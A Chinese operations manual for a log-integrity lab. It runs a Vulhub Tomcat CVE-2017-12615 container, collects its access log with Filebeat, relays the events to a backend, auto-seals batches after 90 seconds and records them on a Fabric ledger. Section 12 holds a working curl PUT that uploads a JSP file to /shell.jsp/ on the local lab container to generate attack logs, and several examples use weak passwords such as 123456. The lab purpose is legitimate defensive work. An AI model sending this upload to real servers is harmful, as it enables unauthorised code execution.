# 阶段10：Vulhub + Filebeat 自动采集与 90 秒缓冲自动 Seal 操作手册

本手册用于在真实三虚拟机环境中手工完成 Stage 10 验收：

- `node1` 启动 Vulhub `tomcat/CVE-2017-12615`。
- Tomcat `access.log` 挂载到宿主机目录 `/opt/log-trace/vulhub-logs/tomcat`。
- Filebeat 采集该目录日志并写入本地 spool。
- 中继脚本把 spool 中的事件按小批次转成后端内部 ingest 请求。
- 后端自动入库、异步副本同步、90 秒缓冲自动 seal、自动上链。

执行方式：你使用 Xshell 登录虚拟机，使用 Xftp 上传文件。本文不提供自动排障章节；若遇到异常，直接回到对话里问我。

## 0. 阶段边界

本阶段只做：

- 接入固定场景 `tomcat/CVE-2017-12615`。
- 仅采集 `Tomcat access.log`。
- 启用 Filebeat 本地落盘 spool。
- 启用 Python 中继到后端内部接口 `POST /api/internal/ingest/filebeat`。
- 启用后端 90 秒缓冲自动 seal。
- 验证正常访问和攻击访问都能自动完成入库、三库同步、自动上链和账本查询。

本阶段不做：

- 不修改 OpenAPI。
- 不修改链码 ABI。
- 不修改 MySQL schema。
- 不在手册中提供常见故障排查章节。
- 不在真实虚拟机上运行任何“由我代为执行”的命令；你按本手册手工执行。

## 1. 固定参数

| 项 | 值 |
|---|---|
| 后端宿主机端口 | `8080` |
| Vulhub 节点 | `node1` |
| Vulhub 场景 | `tomcat/CVE-2017-12615` |
| Vulhub 推荐宿主机访问端口 | `18080` |
| Tomcat 日志宿主机目录 | `/opt/log-trace/vulhub-logs/tomcat` |
| Filebeat 采集路径 | `/opt/log-trace/vulhub-logs/tomcat/localhost_access_log.*.txt` |
| 后端内部 ingest URL | `http://127.0.0.1:8080/api/internal/ingest/filebeat` |
| 自动 seal source | `tomcat-cve-2017-12615` |
| 自动 seal 缓冲 | `90` 秒 |
| 自动 seal 扫描间隔 | `15` 秒 |

## 2. 批次窗口约定

阶段 10 的 `batch_id` 由真实 access log 时间自动生成，不再预先固定死日期。

建议你这样执行：

- 把“正常访问”与“攻击访问”放到两个相邻分钟窗口，便于验收时区分两个批次。
- 正常访问完成后，先在数据库里记下当分钟生成的 `batch_id`。
- 进入下一分钟后再触发攻击流量，再记下第二个 `batch_id`。
- 后续所有 Fabric 与完整性校验，都以数据库实际查到的 `batch_id` 为准。

## 3. Xftp 上传与目录准备

在 Windows 中用 Xftp 上传到 `node1`，推荐项目目录：

```text
/home/yangli/Documents/logtrace/
```

至少上传：

```text
backend/
docs/
ops/backend-runtime.env.example
ops/stage10/README.md
ops/stage10/filebeat.yml.example
ops/stage10/relay.env.example
ops/stage10/log-relay.py
ops/stage10/log-relay.service
```

在 `node1` 创建运行目录：

```bash
sudo mkdir -p /opt/log-trace/vulhub-logs/tomcat
sudo mkdir -p /var/spool/logtrace-stage10
sudo mkdir -p /var/lib/logtrace-stage10
sudo chown -R yangli:yangli /opt/log-trace /var/spool/logtrace-stage10 /var/lib/logtrace-stage10
```

## 4. node1 前置检查

在 `node1` 执行：

```bash
java -version
mvn -version
python3 --version
filebeat version
docker --version
docker compose version
```

预期：

- Java 至少 `21`。
- Maven 可用。
- Python 3 可用。
- Filebeat 已安装。
- Docker / Docker Compose 可用。

## 5. 配置后端环境并启动

在 `node1`：

```bash
cd /home/yangli/Documents/logtrace/backend
cp ../ops/backend-runtime.env.example ./backend-stage10.env
vim backend-stage10.env
```

必须把 `CHANGE_ME_*` 改成真实值，并确保以下阶段 10 配置存在：

```bash
LOGTRACE_JWT_SECRET='change-me-at-least-32-bytes'
LOGTRACE_INTERNAL_INGEST_SHARED_TOKEN='change-me-stage10-machine-token'
LOGTRACE_AUTO_SEAL_ENABLED=true
LOGTRACE_AUTO_SEAL_SOURCE=tomcat-cve-2017-12615
LOGTRACE_AUTO_SEAL_POLL_INTERVAL_MILLIS=15000
LOGTRACE_AUTO_SEAL_BUFFER_SECONDS=90
LOGTRACE_AUTO_SEAL_MAX_WINDOWS_PER_RUN=10
LOGTRACE_AUTO_SEAL_EARLIEST_WINDOW_START='2026-05-11T11:20:00Z'
```

其中 `LOGTRACE_AUTO_SEAL_EARLIEST_WINDOW_START` 要改成你这次在 `node1` 真正启用阶段 10 自动 seal 的起始分钟 UTC 时间。

换算方法：

- 如果你在北京时间 `2026-05-11 19:20` 开始阶段 10 自动链路，就写 `2026-05-11T11:20:00Z`。
- 它的作用是只处理这个分钟及之后产生的新窗口，避免把阶段 9.5 故意保留的历史篡改窗口反复拿来自动 seal。

加载环境变量并启动后端：

```bash
cd /home/yangli/Documents/logtrace/backend
set -a
source ./backend-stage10.env
set +a

mvn spring-boot:run
```

另开一个 Xshell 窗口检查后端已启动：

```bash
curl -s http://127.0.0.1:8080/swagger-ui.html >/dev/null && echo backend-up
```

预期输出：

```text
backend-up
```

## 6. 部署中继与 systemd

复制示例配置并填写：

```bash
cd /home/yangli/Documents/logtrace/ops/stage10
cp ./relay.env.example ./relay.env
vim ./relay.env
chmod +x ./log-relay.py
```

至少确认：

```bash
LOGTRACE_RELAY_SHARED_TOKEN='change-me-stage10-machine-token'
LOGTRACE_RELAY_ENDPOINT='http://127.0.0.1:8080/api/internal/ingest/filebeat'
LOGTRACE_RELAY_SPOOL_GLOB='/var/spool/logtrace-stage10/filebeat-stage10*'
LOGTRACE_RELAY_STATE_PATH='/var/lib/logtrace-stage10/relay-state.json'
LOGTRACE_RELAY_DEAD_LETTER_PATH='/var/lib/logtrace-stage10/dead-letter.ndjson'
```

安装 systemd 服务：

```bash
sudo cp /home/yangli/Documents/logtrace/ops/stage10/log-relay.service /etc/systemd/system/log-relay.service
sudo systemctl daemon-reload
sudo systemctl enable log-relay.service
```

## 7. 配置 Filebeat

在 `node1`：

```bash
sudo cp /home/yangli/Documents/logtrace/ops/stage10/filebeat.yml.example /etc/filebeat/filebeat.yml
sudo filebeat test config -c /etc/filebeat/filebeat.yml
```

确认 `output.file` 指向：

```text
/var/spool/logtrace-stage10
```

## 8. 启动 Vulhub Tomcat 与 access log 挂载

假定 Vulhub 工作目录位于：

```text
/home/yangli/Documents/vulhub/tomcat/CVE-2017-12615
```

如你的 Vulhub 实际目录不同，请替换为真实路径。

在 `node1`：

```bash
cd /home/yangli/Documents/vulhub/tomcat/CVE-2017-12615
grep -n "ports" -A 3 docker-compose.yml
```

如果你看到 Tomcat 对宿主机映射的是 `8080:8080`，先改成 `18080:8080`，因为本阶段后端已经占用 `node1:8080`。

确认修改后再启动：

```bash
cd /home/yangli/Documents/vulhub/tomcat/CVE-2017-12615
docker compose up -d
docker ps --format '{{.Names}} {{.Status}}'
curl -i http://127.0.0.1:18080/
```

找到 Tomcat 容器名后，确认容器内 access log 目录：

```bash
docker exec -it <tomcat-container-name> ls -l /usr/local/tomcat/logs
```

将 access log 复制或挂载到宿主机目录时，目标是让宿主机路径中能看到：

```text
/opt/log-trace/vulhub-logs/tomcat/localhost_access_log.<yyyy-mm-dd>.txt
```

如你需要修改 Tomcat `AccessLogValve`，要求：

- `buffered="false"`
- 日志格式保持当前后端已支持的标准 access log 样式

## 9. 启动 Filebeat 与中继

在 `node1`：

```bash
sudo systemctl restart filebeat
sudo systemctl status filebeat --no-pager

sudo systemctl restart log-relay.service
sudo systemctl status log-relay.service --no-pager
```

确认 spool 文件已生成：

```bash
ls -l /var/spool/logtrace-stage10
```

## 10. 注册管理员并获取 JWT

如果还没有账号，先注册：

```bash
curl -s -X POST http://127.0.0.1:8080/api/auth/register \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"Admin@123456","display_name":"Stage10 Admin"}'
```

登录获取 JWT：

```bash
TOKEN=$(curl -s -X POST http://127.0.0.1:8080/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"Admin@123456"}' \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['access_token'])")

echo "$TOKEN"
```

## 11. 正常流量触发

在 `node1`：

```bash
for i in 1 2 3 4 5; do
  curl -s http://127.0.0.1:18080/ >/dev/null || true
  sleep 1
done
```

确认 access log 已落到宿主机目录：

```bash
ls -l /opt/log-trace/vulhub-logs/tomcat
tail -n 20 /opt/log-trace/vulhub-logs/tomcat/localhost_access_log.*.txt
```

## 12. 攻击流量触发

在 `node1`：

```bash
curl -i -X PUT "http://127.0.0.1:18080/shell.jsp/" \
  -H "Content-Range: bytes 0-5/6" \
  -H "Content-Type: application/octet-stream" \
  --data-binary '<%out.println("pwned");%>'
```

再次确认 access log 中出现 `PUT /shell.jsp/`：

```bash
tail -n 20 /opt/log-trace/vulhub-logs/tomcat/localhost_access_log.*.txt
```

## 13. 自动入库与三库检查

等待 Filebeat 与中继完成处理后，在 `node1` 查询：

```bash
mysql -u"logtrace_app" -p"123456" \
  -h127.0.0.1 -Dlogtrace_node1 \
  -e "SELECT batch_id, request_method, request_uri, status_code, source_node
      FROM log_records
      WHERE source='tomcat-cve-2017-12615'
      ORDER BY event_time DESC, log_id DESC
      LIMIT 20;"

mysql -u"logtrace_app" -p"123456" \
  -h192.168.88.102 -Dlogtrace_node2 \
  -e "SELECT batch_id, request_method, request_uri, status_code, source_node
      FROM log_records
      WHERE source='tomcat-cve-2017-12615'
      ORDER BY event_time DESC, log_id DESC
      LIMIT 20;"

mysql -u"logtrace_app" -p"123456" \
  -h192.168.88.103 -Dlogtrace_node3 \
  -e "SELECT batch_id, request_method, request_uri, status_code, source_node
      FROM log_records
      WHERE source='tomcat-cve-2017-12615'
      ORDER BY event_time DESC, log_id DESC
      LIMIT 20;"
```

预期：

- `GET /` 日志和 `PUT /shell.jsp/` 日志都可见。
- 三库都出现对应批次。
- `source_node` 分别为 `node1`、`node2`、`node3`。
- 以后续查询、Fabric 校验和完整性验收使用这里实际查到的 `batch_id` 为准。

## 14. 自动 Seal 与 Fabric 校验

从该分钟窗口结束起，等待至少 `90` 秒，再检查本地 batch：

```bash
mysql -u"logtrace_app" -p"123456" \
  -h127.0.0.1 -Dlogtrace_node1 \
  -e "SELECT batch_id, source, log_count, merkle_root, seal_status, chain_tx_id
      FROM log_batches
      WHERE source='tomcat-cve-2017-12615'
      ORDER BY start_time DESC
      LIMIT 10;"
```

预期：

- 出现新批次。
- `seal_status` 为 `CHAIN_COMMITTED`。
- `chain_tx_id` 非空。

然后用后端接口查询：

```bash
curl -s "http://127.0.0.1:8080/api/ledger/batches?source=tomcat-cve-2017-12615" \
  -H "Authorization: Bearer $TOKEN"
```

如已知具体 `batch_id`，可继续验证：

```bash
curl -s "http://127.0.0.1:8080/api/ledger/batches/bch_v1_tomcat-cve-2017-12615_20260511T125000Z" \
  -H "Authorization: Bearer $TOKEN"
```

## 15. 完整性校验验收

以新生成的 `batch_id` 执行：

```bash
curl -s -X POST http://127.0.0.1:8080/api/integrity/check \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"batch_id":"bch_v1_tomcat-cve-2017-12615_20260511T125000Z"}'
```

预期：

- 正常自动链路场景下，不应出现异常副本。
- `GET /` 与 `PUT /shell.jsp/` 均已体现在同阶段 10 自动采集链路内。

## 16. 重启后不重复明文验收

执行：

```bash
sudo systemctl restart filebeat
sudo systemctl restart log-relay.service
sleep 10
```

然后检查最近窗口的日志数量没有异常重复增长：

```bash
mysql -u"logtrace_app" -p"123456" \
  -h127.0.0.1 -Dlogtrace_node1 \
  -e "SELECT batch_id, COUNT(*) AS cnt
      FROM log_records
      WHERE source='tomcat-cve-2017-12615'
      GROUP BY batch_id
      ORDER BY batch_id DESC
      LIMIT 10;"
```

如你要验证迟到日志拒收，可人工把已 seal 窗口的旧日志重新写入 spool 文件，然后检查：

```bash
tail -n 20 /var/lib/logtrace-stage10/dead-letter.ndjson
```

预期：

- 已 seal 窗口的迟到日志进入 dead-letter。
- MySQL 与 Fabric 不应被该迟到日志污染。
